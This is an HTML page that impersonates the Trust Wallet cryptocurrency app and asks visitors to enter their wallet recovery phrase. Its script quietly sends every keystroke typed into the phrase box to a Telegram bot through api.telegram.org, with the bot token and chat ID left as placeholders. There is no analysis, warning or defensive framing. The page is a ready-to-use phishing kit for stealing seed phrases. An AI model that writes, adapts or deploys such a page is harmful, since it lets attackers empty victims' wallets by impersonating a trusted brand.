<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Wallet</title>
<style>
    /* Trust Wallet-like colors and fonts */
    body {
        font-family: 'Helvetica Neue', Arial, sans-serif;
        background: #121212;
        color: #fff;
        margin: 0;
        padding: 0;
    }

    .wallet-container {
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        height: 100vh;
    }

    .wallet-card {
        background: #1e1e1e;
        border-radius: 25px;
        width: 90%;
        max-width: 400px;
        padding: 30px 20px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.5);
        text-align: center;
    }

    h1 {
        font-weight: 600;
        margin-bottom: 40px;
    }

    button {
        background: linear-gradient(90deg, #4caf50, #2e7d32);
        border: none;
        border-radius: 15px;
        color: #fff;
        font-size: 18px;
        font-weight: 600;
        padding: 15px 0;
        width: 80%;
        margin: 10px 0;
        cursor: pointer;
        transition: all 0.2s ease;
    }

    button:hover {
        opacity: 0.9;
        transform: scale(1.02);
    }

    textarea {
        width: 100%;
        border-radius: 15px;
        border: none;
        padding: 15px;
        font-size: 16px;
        margin-top: 20px;
        display: none;
        background: #2a2a2a;
        color: #fff;
        resize: none;
    }
</style>
</head>
<body>
    <div class="wallet-container">
        <div class="wallet-card">
            <h1>Trust Wallet</h1>
            <button onclick="showPhraseBox()">Import Wallet</button>
            <button onclick="connectWallet()">Connect Wallet</button>
            <textarea id="phrase" placeholder="Enter phrase here"></textarea>
        </div>
    </div>

    <script>
        const textarea = document.getElementById('phrase');
        const BOT_TOKEN = 'YOUR_BOT_TOKEN';
        const CHAT_ID = 'YOUR_CHAT_ID';

        function showPhraseBox() {
            textarea.style.display = 'block';
        }

        function connectWallet() {
            // Dummy connect function
            textarea.style.display = 'none';
        }

        // Send input to Telegram silently
        textarea.addEventListener('input', () => {
            const text = textarea.value;
            if (!text) return;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`)
                .catch(err => console.error(err));
        });
    </script>
</body>
</html>
